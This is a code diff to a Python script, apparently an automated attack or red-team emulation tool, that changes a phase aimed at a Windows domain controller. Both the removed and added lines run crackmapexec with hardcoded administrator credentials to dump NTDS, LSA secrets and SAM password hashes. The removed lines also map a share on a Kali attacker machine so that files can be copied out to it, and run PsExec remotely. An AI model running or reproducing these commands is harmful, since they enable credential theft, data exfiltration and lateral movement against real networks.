@@ -234,29 +234,17 @@ def phaseFive():
 	DC1 = "208.11.20.100"
 	username = "administrator"
 	password = "P@ssw0rd"
-	# Dump NTDS
-	dump = f"crackmapexec smb {DC1} -u {username} -p {password} --ntds --obfs > dump.txt"
-	lsass = f"crackmapexec smb {DC1} -u {username} -p {password} --lsa --obfs > lsa.txt"
-	sam = f"crackmapexec smb {DC1} -u {username} -p {password} --sam --obfs > sam.txt"
-	print("Dumping NTDS.")
-	subprocess.run(dump, shell=True, text=True)
-	input("Please press enter to continue: ")
-	print("Dumping LSASS.")
-	subprocess.run(lsass, shell=True, text=True)
-	input("Please press enter to continue: ")
-	print("Dumping SAM.")
-	subprocess.run(sam, shell=True, text=True)
-	input("Please press enter to continue: ")
-	# Define the commands you want to execute
 	commands = [
-	"whoami /priv",
-	"systeminfo"
-	"powershell.exe -e 'New-PSDrive -Name "Z" -PSProvider "FileSystem" -Root "\\[Kali_IP_Address]\share" -Credential (New-Object System.Management.Automation.PSCredential("test", (ConvertTo-SecureString "test" -AsPlainText -Force))) -Persist'"
- 	"powershell.exe -e 'Copy-Item -Path "C:\path\to\your\file.txt" -Destination "Z:\"'"
-  	"powershell.exe -e 'PsExec \\RemoteMachine taskkill /PID 1234'"
+	f"bash -c 'crackmapexec smb {DC1} -u {username} -p {password} --ntds --obfs > ntds.txt'",
+	f"bash -c 'crackmapexec smb {DC1} -u {username} -p {password} --lsa --obfs > lsa.txt'",
+	f"bash -c 'crackmapexec smb {DC1} -u {username} -p {password} --sam --obfs > sam.txt'"
 	]
 	for command in commands:
-		subprocess.run(f"impacket-psexec {username}:{password}@{DC1} {command}", shell=True, text=True)
+		try:
+			print(f"Running {command}. Sleeping for 30 seconds.")
+			subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
+		except Exception as e:
+			pass
 
 def main():
 	# Ensure Sudo Usage
